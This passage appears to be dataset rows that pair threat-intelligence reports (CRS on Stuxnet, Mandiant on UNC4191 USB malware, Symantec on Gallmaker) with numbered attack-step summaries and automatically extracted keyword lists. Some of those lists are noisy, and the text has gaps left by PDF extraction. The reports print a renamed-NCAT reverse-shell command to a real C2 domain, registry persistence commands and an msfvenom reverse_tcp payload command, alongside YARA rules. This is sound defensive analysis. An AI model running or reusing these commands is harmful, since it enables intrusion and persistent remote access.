‘Intelligence Game’ - Iran President,” Islamic Republic of Iran News Network, November 29, 2010. 28 Fredrik Dahl and Sylvia Westall, “Technical Woes Halt Some Iran Nuclear Machines – Dips,” Reuters, November 23, 2010. 29 Mehr News Agency, September 25, 2010. 30 Islamic Republic of Iran News Network, October 5, 2010. 31 “Iran—Officials Characterize Stuxnet as ‘Cyber War,’ Maintain Ambiguity About Virus,” Open Source Center, October 20, 2010. 32 David E. Sanger, “U.S. Rejected Aid for Israeli Raid on Nuclear Site,” New York Times, January 11, 2009. 33 David E. Sanger and William J. Broad, “U.S. Sees an Opportunity to Press Iran on Nuclear Fuel,” New York Times, January 3, 2010. Iranian officials alluded to this incident, according to a January 2007 Iranian press report (Ayande-ye Now, January 6, 2007). 34 James Blitz, Roula Khalaf, and Daniel Dombey, “Suggestions of Iran Nuclear Sabotage,” Financial Times, July 22, 2010. 35 James Risen, State of War: The Secret History of the CIA and the Bush Administration (New York: Free Press), 2006.Congressional Research Service5The Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilityICS Vulnerabilities and Critical Infrastructure Vulnerabilities in industrial control systems have long been an issue of concern to both the security and technology communities.36 Modern critical infrastructure facilities rely on computer hardware and software continuously to monitor and control equipment that supports numerous industrial processes, including nuclear plant management, electrical power generation, water distribution and waste control, oil and gas refinement, chemical production, and transportation management. The Department of Homeland Security (DHS) categorizes 18 critical infrastructure sectors as “essential to the nation’s security, public health and safety, economic vitality, and way of life.”37 The advent of the Stuxnet virus has raised questions on the vulnerabilities of national critical infrastructure. In the absence of specific information on the full impact of Stuxnet, one can speculate that all these sectors may be at risk.Many observers fear that a successful infiltration and attack could degrade or stop the operation of a critical infrastructure facility that delivers water, gas, or other essential utility, or affect multiple facilities due to the interdependent nature of the nation’s infrastructure sectors responsible for providing essential services. Sean McGurk, the Department of Homeland Security’s Acting Director of the National Cybersecurity and Communications Integration Center stated during a November 2010 hearing, “We have not seen this coordinated effort of information technology vulnerabilities and industrial control exploitation completely wrapped up in one unique package. To use a very overused term, it is a game-changer.”38 Unclassified reports suggest that the Stuxnet worm was specifically developed to seek out and exploit vulnerabilities in software that manages ICSs found in most critical infrastructure facilities. One type of ICS, a Supervisory Control and Data Acquisition (SCADA) system,39 is a computer that controls industrial processes and infrastructures. SCADA systems can be accessed and managed directly at computer terminals, either from remote locations that are connected to the control system, or through the emerging trend of controlling these systems from mobile wireless devices.In 2009, DHS conducted an experiment that revealed some of the vulnerabilities to cyber attack inherent in the SCADA systems that control power generators and grids. The experiment, known as the Aurora Project, simulated a computer-based attack on a power generator’s control system that caused operations to cease.40 The same vulnerabilities are said to exist in other critical infrastructure, which, if disabled, could both cripple the economy and have physical consequences; an electrical blackout for a prolonged period of time could potentially lead to loss of life if essential services were not restored. Yet some experts argue that the cyber threat to critical infrastructure is exaggerated, regardless of the perpetrators’ capabilities.41 For example,36 Guide to industrial control security, Department of Commerce, NIST, September 2008, url publications/drafts/800-82/draft_sp800-82-fpd.pdf. See also Interview with Joseph Weiss, Cyberwar Frontline, Public Broadcasting Service, March 5, 2003, url 37 DHS website, Critical Infrastructure and Key Resources, url gc_1189168948944.shtm, last accessed November 2, 2010. 38 Rob Margetta, “Stuxnet Could Be a Harbinger of Threats to Come for U.S.,” Congressional Quarterly – Homeland Security, November 17, 2010, url news-all. 39 For more detailed information on SCADA, see url 40 See “Challenges Remain in DHS’ Efforts to Security Control Systems,” Department of Homeland Security, Office of Inspector General, August 2009. 41 Anthony H. Cordesman and Justin G. Cordesman, Cyber-Threats, Information Warfare, and Critical Infrastructure (continued )Congressional Research Service6The Stuxnet Computer Worm: Harbinger of an Emerging Warfare Capabilityalthough the computer systems that control electricity plants could be penetrated by a sophisticated hacker, some infrastructure experts argue that the multitude of public and private companies and the overlapping nature of their operations creates a resiliency that would make long-term and widespread damage implausible.42 Moreover, the North American power grid is segmented into four large regions, reducing the risk of a nation-wide failure. Yet due to their interconnected nature, it is possible that a failure in one system could cause cascading effects across an entire region. An example of this was seen in August 2003, when high-voltage power lines in Ohio came in contact with trees, triggering the automatic safety system to disconnect. Safety mechanisms of other generators then shut down and severed links between them, causing a blackout throughout the northeastern United States and Canada.43Experts offer various recommendations to address the vulnerabilities described above. Some information security experts advocate mandatory encryption of computer data in SCADA- controlled utilities transmission and distribution systems. The Department of Energy is undertaking research and development efforts to modernize the electric grid with new information technology and thereby create a so-called “Smart Grid”44 that will be more prevalent and accessible throughout the nation and may also be more secure. However, some security observers argue that creating a dependency on ubiquitous computer technologies will increase vulnerabilities to hacking, worms, viruses, or other cyber threats, and that a multi-layered, redundant network creates a higher level of protection.45 Another option is to enhance the protection of the physical aspects of the nation’s critical infrastructure, thus mitigating possible damage from a Stuxnet worm type of attack and also better preparing facilities to respond to natural or man-made threats.National Security Implications Whether it is electricity, telecommunications, transportation, or other essential services, many federal government activities rely on critical infrastructures that are predominately owned and operated by the private sector, which has an expectation of immediately accessible and fully operational use of these resources. Should the ICS of a critical infrastructure facility become affected by a Stuxnet worm or similar malicious code, disruptions could hamper the government’s ability to provide domestic and international security, safety, and essential services for lengthy periods of time. Such an occurrence could also degrade the government’s ability to pursue or maintain national security goals and thereby make the nation more vulnerable to a variety of foreign and domestic threats or contribute to a loss of public confidence in the government.( continued) Protection: Defending the U.S. Homeland (Praeger Publishers, 2001), pp. 169-170. 42 Seymour M. Hersh, “The Online Threat: Should we be worried about a cyber war?” The New Yorker, November 1, 2010. 43 William D. O’Neil, “Cyberspace and Infrastructure,” in Cyberpower and National Security, ed. Franklin D. Kramer, Stuart H. Starr, Larry K. Wentz (National Defense University Press, 2009). 44 For more information about the Smart Grid, see the Department of Energy, The Smart Grid: An Introduction, url For further information, see The Smart Grid: An Introduction prepared for the U.S. Department of Energy by Litos Strategic Communication, 2008, accessed at url 45 See 21 Steps to Improve Cyber Security of SCADA Networks, U.S. Department of Energy, accessed at url Research Service7The Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilityThe predominant view of many security observers appears to be that the recent emergence of the worm may be a new type of threat that could potentially lead to short- and long-term adverse global security consequences. However, some security experts claim that the threat of cyberwar in general is exaggerated by security firms and government entities in an effort to procure more resources and control over information technology.46 Yet these claims are not related specifically to Stuxnet. In October 2010, Dr. Udo Helmbrecht, Executive Director of the European Network and Information Security Agency, stated, “Stuxnet is really a paradigm shift, as Stuxnet is a new class and dimension of malware. Not only for its complexity and sophistication the fact that perpetrators activated such an attack tool can be considered as the ‘first strike,’ i.e. one of the first organized, well prepared attack against major industrial resources. This has tremendous effect on how to protect national (critical infrastructure) in the future.”47 The Stuxnet worm is unique because the software code appears to have been designed to infiltrate and attack an ICS often used by critical infrastructure facilities in order to cause long-term physical damage to them. Although the full extent of damage caused by Stuxnet is unknown, the potential implications of such a capability are numerous in that the worm’s ability to identify specific ICSs and wait for an opportune time to launch an attack could have catastrophic consequences on nations’ critical infrastructures.IssuesThe possibility of this type of cyber threat to national critical infrastructure raises several questions for policymakers. It is said that actions in cyberspace are conducted in milliseconds. When the consequences of retaliatory actions in cyberspace may be unknown, is an immediate response required, or a longer, more deliberative process? The lack of clear attribution further complicates the issue. If a cyber attack appeared to be launched from an unsuspecting neutral country, it may not be possible to formally engage that country in stopping an attack that is taking place in milliseconds. What authorities should be in place if such an attack were deemed to warrant an immediate response from the affected nation? Is an international treaty or convention necessary to curb proliferation and use of cyber-based weapons? Many arms control treaties are built upon inspection, verification, and compliance regimes. As nefarious activities in cyberspace defy geographical boundaries and often attribution, how would such activities be conducted in a cyber arms control treaty?Another issue raised by Stuxnet is the government’s role in protecting critical infrastructure. Is the Department of Homeland Security equipped to protect national infrastructure? Would new authorities be necessary in order to oversee the defense of privately owned critical infrastructure facilities? What is the military’s role in defending national critical infrastructure from cyber attack? What role should intelligence agencies have in monitoring private infrastructure? Is the threat of cyber war exaggerated in order to shift power over the internet to the military and intelligence agencies? Is the private sector the first line of defense in the event of a cyber attack on critical infrastructure? Is new legislation required to standardize and regulate critical infrastructure protection throughout the various sectors?46 Ryan Singel, “Cyberwar Hype Intended to Destroy the Open Internet,” Wired, March 1, 2010. 47 EU Agency analysis of ‘Stuxnet’ malware: a paradigm shift in threats and Critical Information Infrastructure Protection, Press Release initial comment and brief, high level analysis of the recent ‘Stuxnet’ attacks, October 7, 2010, url in-threats-and-critical-information-infrastructure-protection-1.Congressional Research Service8The Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilityAppendix. GlossaryMalware WormVirusBotnetICSIPCodeMalware is a general term used to describe various types of malicious software. A worm is a type of malware that can copy itself and spread through a network, without attaching itself to a file.A virus usually refers to a computer program that can infect a file, copy itself, and spread to other computers.A botnet is a collection of malware-infected computers that are controlled by a remote source.The term ICS encompasses software that controls production and distribution in industries such as oil, water, electrical, gas, and data.Internet Protocol is the language and method by which data is transmitted between computers. An IP address is a computer’s numerical assignment.The numbers, letters, and symbols used to deliver instructions to a computer. A computer program is composed of code.Server Air-gappedA server is a computer or program that provides services to other computers.An air-gapped network is one that is not connected to any other network, including the Internet, and only allows internal data transmission.Author Contact Information Paul K. Kerr Analyst in Nonproliferation pkerr@crs.loc.gov, 7-8693Catherine A. TheoharyAnalyst in National Security Policy and Information Operations ctheohary@crs.loc.gov, 7-0844John Rollins Specialist in Terrorism and National Security jrollins@crs.loc.gov, 7-5529Congressional Research Service9 "," 1. Spread initially via infected USB drives, not through the internet. 2. Infects the Windows-based control system made by Siemens that monitors industrial equipment. 3. Remains hidden on the system, periodically checking normal frequencies of the equipment. 4. Reprograms the control system to give unexpected commands to the industrial equipment at a time when normal frequencies indicate the system is operating. 5. Causes the equipment to perform erratically or shutdown, leading to failures. 6. Spreads through networks and USB drives to additional systems after initial infection. ",valid_58,"['all', 'ed', 'USB', 'the internet', 'Windows', 'Siemens', 'equipment', 'the system', 'program', 'the control system', 'time', 'use', 'networks', 'addition']",all; ed; USB; the internet; Windows; Siemens; equipment; the system; program; the control system; time; use; networks; addition.
"www.mandiant.com /resources/blog/china-nexus-espionage-southeast-asia Always Another Secret: Lifting the Haze on China-nexus Espionage in Southeast AsiaMandiant Managed Defense recently identified cyber espionage activity that heavily leverages USB devices as an initial infection vector and concentrates on the Philippines. Mandiant tracks this activity as UNC4191 and we assess it has a China nexus.UNC4191 operations have affected a range of public and private sector entities primarily in Southeast Asia and extending to the U.S., Europe, and APJ; however, even when targeted organizations were based in other locations, the specific systems targeted by UNC4191 were also found to be physically located in the Philippines.Following initial infection via USB devices, the threat actor leveraged legitimately signed binaries to side- load malware, including three new families we refer to as MISTCLOAK, DARKDEW, and BLUEHAZE. Successful compromise led to the deployment of a renamed NCAT binary and execution of a reverse shell on the victim’s system, providing backdoor access to the threat actor. The malware self-replicates by infecting new removable drives that are plugged into a compromised system, allowing the malicious payloads to propagate to additional systems and potentially collect data from air-gapped systems.Mandiant Managed Defense performs continuous threat hunting for customers, discovering evidence of new tactics, techniques, and procedures (TTPs) that can evade traditional detection mechanismsIn response to this campaign, Mandiant deployed new real-time detections, enhancing Managed Defense’s protection for our customers from future similar activity. Our Adversary Operations team created and deployed YARA rules and Mandiant Security Validation Actions, shared at the end of the post. This blog post details our initial threat hunting discovery, the newly identified malware families, detection opportunities, and Mandiant’s assessment about the goals and motivations of the threat actor. Malware ObservedMandiant observed UNC4191 deploy the following malware families.Descriptionpayload stored in a file on disk.Table 1: UNC4191 Malware FamiliesMalware Family MISTCLOAK MISTCLOAK is a launcher written in C++ that executes an encrypted executable BLUEHAZE BLUEHAZE is a launcher written in C/C++ that launches a copy of NCAT to create a DARKDEW DARKDEW is a dropper written in C++ that is capable of infecting removable drives. NCAT is a command-line networking utility that was written for the Nmap Project to NCAT perform a wide-variety of security and administration tasks. While NCAT may be used for legitimate purposes, threat actors may also use it to upload or downloadreverse shell to a hardcoded command and control (C2).1/12files, create backdoors or reverse shells, and tunnel traffic to evade network controls. Initial DetectionMandiant Managed Defense customers receive Mandiant’s dedicated proactive Threat Hunting service. Mandiant's threat hunting team leverages the MITRE ATT&CK® framework as a guide for developing Hunt Missions that examine endpoint telemetry data, such as process events, for collection and ATT&CK technique ID tagging. The resulting threat hunting data set provides the team with wide visibility across the customer base. When performing analysis, we augment this data set with more targeted sources, like custom, real-time alerting from our customers’ endpoint detection and response (EDR) technologies.Mandiant uses custom tooling to identify ATT&CK technique sequences and clusters associated with common threat actor behaviors. A technique sequence is useful for identifying events with a defined order of execution, such as the creation of a local account (T1136.001) and then addition to the local Administrators group (T1098). A technique cluster identifies a grouping of techniques that don’t necessarily occur in a specific order. By focusing on technique sequences and clusters, we reduce the amount of data that needs to be manually reviewed by analysts.For example, Mandiant has observed threat actors enumerating domain trusts (T1482) and querying domain and local group permissions (T1069.001, T1069.002) within a several minute span (Figure 1). The combined event count for these three techniques occurring on their own can number in the hundreds of thousands, but by applying technique sequencing or clustering we can reduce the number of interesting events to a manageable amount.2/12Figure 1: Visualization of technique sequencing and clustering conceptsMandiant identified this UNC4191 campaign by searching for anomalous sequences of events under our “Mandiant Intelligence: Staging Directories” and “Command and Scripting Interpreter: Windows Command Shell (T1059.003)” hunting missions (Figure 2).3/12Figure 2: Technique sequence that led to UNC4191 detectionThe techniques performed by UNC4191 led to the development of additional technique sequences and detection opportunities, as described in the Detection Opportunities section. UNC4191 Malware Infection CycleThe overall infection cycle from this campaign can be split into three distinct phases, shown in Figure 3.4/12Figure 3: UNC4191 malware infection cyclePHASE I: MISTCLOAKThe infection chain begins when a user plugs in a compromised removable device and manually executes a renamed signed binary from the root directory of the storage volume (T1091). The initial binaries—named Removable Drive.exe or USB Drive.exe—are versions of a legitimately signed application called USB Network Gate, developed by the company Electronic Team, Inc. These are used to side-load the MISTCLOAK malware that impersonates a legitimate DLL (Table 2).Table 2: Legitimate USB Network Gate binaries used toside-load MISTCLOAK malware directory on the removable device (T1574.002) (Table 3). MISTCLOAK is a launcher for the encrypted file usb.ini, which MISTCLOAK reads from the current directory or the path autorun.inf\Protection for Autorun\System Volume Information\usb.ini. Mandiant identified the PDB file path G:\project\APT\U \new\shellcode\Release\shellcode.pdb in the MISTCLOAK sample. Notably, the Chinese characters  Hijacking\new\u2ec\Release\u2ec.pdb)5/12MISTCLOAK then opens Windows Explorer to the location on the removable device where the user files are stored with the command ‘explorer.exe ""<drive>:\autorun.inf\Protection for Autorun""’.Phase II: DARKDEWThe file usb.ini contains an encrypted DLL payload called DARKDEW that is capable of infecting removable drives. If executed from a removable drive, DARKDEW will launch explorer.exe via `explorer.exe “<drive>:\autorun.inf\Protection for Autorun”` where <drive> is a removable drive letter, such as “E”. DARKDEW will then check if either C:\ProgramData\udisk\disk_watch.exe or C:\ProgramData\udisk\DateCheck.exe exist and will create the directory C:\ProgramData\udisk if neither Volume Information\ to C:\ProgramData\udisk\. Mandiant identified files in this directory, such as Removable Drive (16GB).lnk, that originated from a system that was previously compromised by DARKDEW (T1074.001) and copied to a USB device. The copied data includes the files shown in Table 5 and arbitrary files with the extensions: xlsx, docx, mp4, device, jpg, pptx, pdf, txt, and lnk files.Table 5: Files that are copied by DARKDEW from the removable drive to a compromisedsystemC:\ProgramData\udisk\disk_watch.exeC:\ProgramData\udisk\libeay32.dllC:\ProgramData\udisk\Removable Disk.exeC:\ProgramData\udisk\rzlog4cpp.dllC:\ProgramData\udisk\rzlog4cpp_logger.dllC:\ProgramData\udisk\ssleay32.dllC:\ProgramData\udisk\u2ec.dllC:\ProgramData\udisk\USB Drive.exeC:\ProgramData\udisk\usb.iniC:\ProgramData\udisk\UsbConfig.exe6/12C:\ProgramData\udisk\wuwebv.exeC:\ProgramData\udisk\DateCheck.exeC:\ProgramData\udisk\example.jpgC:\ProgramData\udisk\example.xlsxDARKDEW will then copy the renamed USB Network Gate binary (e.g., Removable Drive.exe) to C:\ProgramData\udisk\disk_watch.exe and create persistence with a registry key value named udisk under HKCU\Software\Microsoft\Windows\CurrentVersion\Run (T1547.001). Finally, DARKDEW will launch a file named C:\ProgramData\udisk\DateCheck.exe and then exit.Table 6: DARKDEW registry persistenceKey: HKCU\Software\Microsoft\Windows\CurrentVersion\RunValue: udiskText: c:\programdata\udisk\disk_watch.exeIf DARKDEW is executed from a non-removable drive, the behavior is slightly different. DARKDEW will create the directory C:\ProgramData\udisk\, then copy every file in the current directory of the parent executable to C:\ProgramData\udisk\. It will then copy the parent executable to C:\ProgramData\udisk\disk_watch.exe and launch it. The persistence mechanism is identical, and it will also launch C:\ProgramData\udisk\DateCheck.exe.When DARKDEW is executed within the context of disk_watch.exe, the malware will scan the system every 10 seconds for removable drives by enumerating volumes from A to Z until it finds one that is removable. The DARKDEW malware then creates the directory <drive>\autorun.inf\Protection for Autorun\, sets its attribute to hidden, and copies the contents of the current working directory of disk_watch.exe to that directory or the subdirectory <drive>:\autorun.inf\Protection for Autorun\System Volume Information\. This capability appears to be a method for self-replication and to transfer files that may be collected from air-gapped systems.Phase III: BLUEHAZEThe binary DateCheck.exe is a renamed version of a legitimate, signed application called Razer registry key value ACNTV under HKCU\Software\Microsoft\Windows\CurrentVersion\Run (T1547.001) for persistence. Next, BLUEHAZE copies all the files from its working directory to C:\Users\Public\Libraries\CNNUDTV\ and then executes a renamed NCAT executable wuwebv.exe to create a reverse shell to the hard-coded command and control (C2) address: closed[.]theworkpc[.]com:80 (T1059). Mandiant has not observed evidence of reverse shell interaction; however, based on the age of the activity, this may be a result of visibility gaps or short log retention periods.DateCheck.exe >Table 9: BLUEHAZE command execution""cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ACNTV /t REG_SZ /d \""Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \""C:\\Users\\Public\\Libraries\\CNNUDTV\\DateCheck.exe\""\"" /f""cmd.exe /c copy *.* C:\\Users\\Public\\Libraries\\CNNUDTV\\""cmd.exe /C wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc[.]com 80 Outlook and ImplicationsBased on available data, such as PE compile timestamps for the malware involved in the aforementioned activity, this campaign potentially extends back to September 2021. Given the worming nature of the malware involved, we may have detected the later stages of this malware’s proliferation.We believe this activity showcases Chinese operations to gain and maintain access to public and private entities for the purposes of intelligence collection related to China’s political and commercial interests. Our observations suggest that entities in the Philippines are the main target of this operation based on the number of affected systems located in this country that were identified by Mandiant. Campaign TrackingMandiant will continue to monitor UNC4191’s campaign and will provide notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, or the use of8/12new infrastructure to carry out their mission.For more insights into how Mandiant tracks this and similar campaigns, see our Threat Campaigns feature within Mandiant Advantage Threat Intelligence. Detection OpportunitiesEach Mandiant threat hunting discovery is evaluated for opportunities to create new real-time detections. These detections help Mandiant identify additional activity across our customers’ environments for rapid escalation and triage analysis and aim to reduce threat actor dwell time.Following our initial campaign discovery, we immediately searched the entire Managed Defense customer base for any activity that matched our atomic indicators of interest, including filenames, file paths, file hashes, IP addresses, domains, and other artifacts. This uncovered activity on systems at multiple customers.Additionally, we also created or updated real-time Managed Defense detections to identify threat actor methodologies, such as:Deployment or usage of NETCAT and NCAT reverse shellsModification of registry Run keys for malware persistence, with arguments configured to execute the Windows binary rundll32.exeProcesses launched from the C:\Users\Public\Libraries\ directoryBy combining Mandiant’s threat intelligence service with Managed Defense’s detection engineering and threat hunting capabilities, we can rapidly identify and provide context around malicious activity.Detection Opportunity NCAT reverse shell execution arguments Parent or grandparent processes executing from Non-C:\ Drive RootMITRE ATT&CK Event Details T1036D:\USB Drive.exewuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc[.]com 80 Process:Child Processes:> explorer.exe ""D:\autorun.inf\Protection for Autorun""> c:\programdata\udisk\disk_watch.exe> c:\programdata\udisk\DateCheck.exeGrandchild Processes:>> ""cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ACNTV /t REG_SZ /d \""Rundll32.exe SHELL32.DLL,ShellExec_RunDLL9/12\""C:\\Users\\Public\\Libraries\\CNNUDTV\\DateCheck.exe\""\"" /f"">> cmd.exe /c copy *.* C:\\Users\\Public\\Libraries\\CNNUDTV\\"">> cmd.exe /C wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc[.]com 80 Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\RunValue: udiskText: c:\programdata\udisk\disk_watch.exe reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ACNTV /t REG_SZ /d \""Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \""C:\\Users\\Public\\Libraries\\CNNUDTV\\DateCheck.exe\""\"" /f"" OriginalFileName: UsbConfig.exeRegistry Run key persistence for binary in PROGRAMDATAT1060Registry Run key T1060File name of executing process doesn’t match original nameT1036, T1574.002File Name: Removable Disk.exe, USB Drive.exeOriginalFileName: RzCefRenderProcess.exeWindows Explorer process execution with folder path specified on command lineFile Name: DateCheck.exe Parent Process Path: D:\USB Drive.exeT1091Process: explorer.exeCommand Line: explorer.exe ""D:\autorun.inf\Protection for Autorun""Mandiant Security Validation ActionsOrganizations can validate their security controls using the following actions with Mandiant Security Validation.NameVID A105-454 Protected Theater - UNC4191, BLUEHAZE, Execution, Variant #1 A105-455 Protected Theater - UNC4191, DARKDEW, Execution, Variant #1 A105-466 Command and Control - UNC4191, DNS Query, Variant #1 author = ""Mandiant""10/12strings: $s1 = ""CheckUsbService"" ascii $s2 = ""new\\u2ec\\Release\\u2ec.pdb"" ascii $s3 = ""autorun.inf\\Protection for Autorun"" ascii condition: uint16(0) == 0x5a4d and filesize < 200KB and (2 of ($s*)) $s1 = ""do inroot"" ascii $s2 = ""disk_watch"" ascii $s5 = ""G:\\project\\APT\\"" ascii $s3 = ""c:\\programdata\\udisk"" ascii $s4 = ""new\\shellcode\\Release\\shellcode.pdb"" ascii condition: filesize < 500KB and (2 of ($s*)) $s1 = ""Libraries\\CNNUDTV"" ascii $s2 = ""closed.theworkpc.com"" ascii $s3 = ""cmd.exe /C wuwebv.exe -t -e"" ascii condition:11/12uint16(0) == 0x5a4d and filesize < 500KB and (2 of ($s*)) } Indicators of CompromiseDescription NCAT C2ValueType Domain closed.theworkpc[.]com DLL Side-Loading) Razer Chromium Render Process (Legitimate Binary used for DLL Side-Loading) AcknowledgementsSpecial thanks to Tobias Krueger and Conor Quigley for their assistance with analyzing the MISTCLOAK, DARKDEW, and BLUEHAZE samples and Matthew Hoerger for creating Mandiant Security Validation (MSV) actions. We would also like to thank Tim Martin, Alexander Pennino, Nick Richard, and Sarah Hawley for their technical review and feedback.12/12 ",1. Threat actor distributes USB drives containing malicious files to targets. 2. Victim inserts USB drive into their computer and executes USBDrive.exe or RemovableDrive.exe. 3. The executable sideloads and executes the MISTCLOAK malware. 4. MISTCLOAK decrypts and executes the DARKDEW malware from an encrypted file on the USB drive. 5. DARKDEW infects any new USB drives inserted into the compromised computer to spread itself. 6. DARKDEW exfiltrates data from air-gapped systems via the infected USB drives. 7. DARKDEW executes the BLUEHAZE malware. 8. BLUEHAZE uses a signed binary to sideload itself and opens a reverse shell to a C2 server. 9. Threat actor establishes persistent access to compromised systems for intelligence collection. ,valid_10,"['Threat actor', 'USB', 'files', 'Victim', 'Drive.exe', 'EDR', 'Table', 'the MISTCLOAK malware', 'the DARKDEW malware', 'data', 'air-gapped systems', 'BLUEHAZE', 'binary', 'a reverse shell', 'C2', 'access', 'intelligence collection']",Threat actor; USB; files; Victim; Drive.exe; EDR; Table; the MISTCLOAK malware; the DARKDEW malware; data; air-gapped systems; BLUEHAZE; binary; a reverse shell; C2; access; intelligence collection.
"Gallmaker: New Attack Group Eschews Malware to Live off the Landsymantec.com/blogs/threat-intelligence/gallmaker-attack-groupSecurity Response Attack Investigation TeamFacebook SHAREPosted: 10 Oct, 2018 6 Min Read Threat IntelligenceA new attack group is targeting government, military, and defense sectors in what appears to be a classic espionage campaign. UPDATE October 11, 2018This blog has been updated with a revised list of IoCs. An earlier list of IOCs attached to this blog was generated through an automated system and, due to the dual-use nature of the tools used by the group, erroneously included some low fidelity IoCs.Symantec researchers have uncovered a previously unknown attack group that is targeting government and military targets, including several overseas embassies of an Eastern European country, and military and defense targets in the Middle East. This group eschews custom malware and uses living off the land (LotL) tactics and publicly available hack tools to carry out activities that bear all the hallmarks of a cyber espionage campaign.1/6""#Gallmaker eschews custom malware, uses living off the land and publicly available hack tools url"" Click to Tweet The group, which we have given the name Gallmaker, has been operating since at least December 2017, with its most recent activity observed in June 2018.Tactics and tools The most interesting aspect of Gallmaker’s approach is that the group doesn’t use malware in its operations. Rather, the attack activity we observed is carried out exclusively using LotL tactics and publicly available hack tools. The group takes a number of steps to gain access to a victim’s device and then deploys several different attack tools, as follows:1. The group delivers a malicious Office lure document to victims, most likely via aspear-phishing email.2. These lure documents use titles with government, military, and diplomatic themes, and the file names are written in English or Cyrillic languages. These documents are not very sophisticated, but evidence of infections shows that they’re effective. The attackers use filenames that would be of interest to a variety of targets in Eastern Europe, including:bg embassy list.docx Navy.ro members list.docx3. These lure documents attempt to exploit the Microsoft Office Dynamic DataExchange (DDE) protocol in order to gain access to victim machines. When the victim opens the lure document, a warning appears asking victims to “enable content” (See Figure 1). Should a user enable this content, the attackers are then able to use the DDE protocol to remotely execute commands in memory on the victim’s system. By running solely in memory, the attackers avoid leaving artifacts on disk, which makes their activities difficult to detect.4. Once the Gallmaker attackers gain access to a device, they execute various tools,including:WindowsRoamingToolsTask: Used to schedule PowerShell scripts and tasks. A ""reverse_tcp"" payload from Metasploit: The attackers use obfuscated shellcode that is executed via PowerShell to download this reverse shell. A legitimate version of the WinZip console: This creates a task to execute commands and communicate with the command-and-control (C&C) server. It’s likely this WinZip console is used to archive data, probably for exfiltration. The Rex PowerShell library, which is publicly available on GitHub, is also seen on victim machines. This library helps create and manipulate PowerShell scripts for use with Metasploit exploits.Gallmaker is using three primary IP addresses for its C&C infrastructure to communicate with infected devices. There is also evidence that it is deleting some of its tools from victim machines once it is finished, to hide traces of its activity.2/6Figure 1. An example of the type of warning displayed by the lure documentThe DDE protocol can be used for legitimate purposes to send messages between Microsoft applications that share data through shared memory, e.g. to share data between Excel and Word.However, the DDE protocol was flagged as unsecure last year , when researchers discovered it could be exploited to execute code on victim machines via Excel and Word, without macros being enabled in those applications. Microsoft said at the time that this capability was a feature and the company did not consider it a vulnerability because Office always warned users before enabling DDE in documents, as seen in Figure 1. However, after the DDE protocol was subsequently exploited in a number of malware campaigns, Microsoft issued an update to Office in December 2017 that disabled DDE by default in Word and Excel. DDE can be enabled manually after this update is applied but only if the registry is altered by an admin account.The Gallmaker victims we have seen did not have this patch installed and therefore were still vulnerable to exploit via the DDE protocol.Targets and timeline3/6Gallmaker’s activity appears to be highly targeted, with its victims all related to government, military, or defense sectors. Several targets are embassies of an Eastern European country. The targeted embassies are located in a number of different regions globally, but all have the same home country.The other targets we have seen are a Middle Eastern defense contractor and a military organization. There are no obvious links between the Eastern European and Middle Eastern targets, but it is clear that Gallmaker is specifically targeting the defense, military, and government sectors: its targets appear unlikely to be random or accidental.Gallmaker’s activity has been quite consistent since we started tracking it. The group has carried out attacks most months since December 2017. Its activity subsequently increased in the second quarter of 2018, with a particular spike in April 2018.Figure 2. Gallmaker activity, December 2017 to June 2018Gallmaker’s activity points strongly to it being a cyber espionage campaign, likely carried out by a state-sponsored group.Gallmaker may well have continued to avoid detection were it not for Symantec’s Targeted Attack Analytics (TAA) technology.How did we discover Gallmaker? The fact that Gallmaker appears to rely exclusively on LotL tactics and publicly available hack tools makes its activities extremely hard to detect. We have written extensively about the increasing use of LotL tools and publicly available hack tools by cyber criminals. One of the primary reasons for the increased popularity of these kinds of tools is to avoid detection; attackers are hoping to “hide in plain sight”, with their malicious activity hidden in a sea of legitimate processes.4/6Gallmaker may well have continued to avoid detection were it not for Symantec’s Targeted Attack Analytics (TAA) technology. TAA combines the capabilities of Symantec’s world- leading security experts with advanced artificial intelligence and machine learning to provide organizations with their own “virtual analysts”, via our Advanced Threat Protection (ATP) product. Since its inception, TAA has detected security incidents at thousands of organizations, automating what would have taken many hours of analyst time. In this instance, TAA identified the specific PowerShell commands used by Gallmaker as being suspicious, leading to the discovery of this new campaign. Without TAA’s advanced AI- based capabilities, Gallmaker’s activities may well have remained undetected.Protection The following protections are in place to protect customers against Gallmaker attacks:System Infected: Meterpreter Reverse TCPW97M.DownloaderNetwork protection products also detect activity associated with Gallmaker.Indicators of Compromise The following indicators are specific to Gallmaker:Network111[.]90.149.99/o2 94[.]140.116.124/o2 94[.]140.116.231/o2Filenamesbg embassy list.docx Navy.ro members list.docx БГ в чуждите медии 23.03.2018-1.docx [REDACTED] and cae join forces to develop integrated live virtual constructive training solutions.docx А-9237-18-brasil.docxGallmaker also used tools that were available in open source projects. Yara rule and methods shared below were used by Gallmaker but aren't exclusive to the group's activity. Detection of these in one's environment is only indicative of possible unauthorized activity. Each occurrence of triggers must be examined to determine intent.rule Suspicious_docx copyright = ""Symantec""5/6family = ""Suspicious DOCX” group = ""Gallmaker"" description = ""Suspicious file that might be Gallmaker”strings: $quote = /<w:fldSimple w:instr="" QUOTE (( [^""]+)* [0-9]{2,3}){4}/ $text = ""select \""Update field\"" and click \""OK\""""condition: any of them }Use of Rex Powershell - url of obfuscated shellcode executed via PowerShell to download a ""reverse_tcp"" payload from Metasploit onto victim systems. For example, msfvenom -p windows/meterpreter/reverse_tcp -o payload.binFurther reading To find out more about TAA, read our whitepaper: Targeted Attack Analytics: Using Cloud- based Artificial Intelligence for Enterprise-Focused Advanced Threat Protection.About the AuthorSecurity Response Attack Investigation TeamThe Attack Investigation Team is a group of security experts within Symantec Security Response whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis which helps customers respond to attacks.6/6 ","1. Gallmaker delivers a 